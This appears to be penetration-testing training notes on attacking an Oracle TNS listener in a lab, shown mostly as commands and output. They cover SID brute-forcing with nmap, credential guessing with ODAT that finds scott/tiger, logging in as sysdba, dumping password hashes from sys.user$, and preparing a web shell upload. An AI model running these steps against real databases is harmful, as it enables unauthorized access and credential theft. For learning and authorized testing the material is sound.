`Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.

---
## Footprinting the Service

#### Nmap
```shell-session
 sudo nmap -p1521 -sV 10.129.204.235 --open
```
```output
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

#### Nmap - SID Bruteforcing
There are various ways to enumerate, or guess SIDs. 
Therefore we can use tools like `nmap`, `hydra`, `odat`, and others.
```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
```output
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE
```
#### ODAT
We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. 
Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. 
Let us use the `all` option and try all modules of the `odat.py` tool.

```shell-session
odat all -s 10.129.204.235
```
```output
[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...
```

In this example, we found valid credentials for the user `scott` and his password `tiger`. 
After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.
#### SQLplus - Log In
```shell-session
sqlplus scott/tiger@10.129.204.235/XE
```
```shell-session
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```
**NOTE: ** If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

```shell-session
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
#### (SQLplus) Oracle RDBMS - Interaction
```shell-session
SQL> select table_name from all_tables;
```
```output
TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...
```
```shell-session
SQL> select * from user_role_privs;
```
```output
USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```
Here, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. 
This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.
#### (SQLplus) Oracle RDBMS - Database Enumeration
```shell-session
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```
```output
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

```
```shell-session
SQL> select * from user_role_privs;
```
```output
USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

#### Oracle RDBMS - Extract Password Hashes
 
However, we can not add new users or make any modifications. 
From this point, we could retrieve the password hashes from the `sys.user$` and try to crack them offline.

```shell-session
SQL> select name, password from sys.user$;
```
```output
NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```


Another option is to upload a web shell to the target. 
However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. 
If we know what type of system we are dealing with, we can try the default paths

| **OS**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |

First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.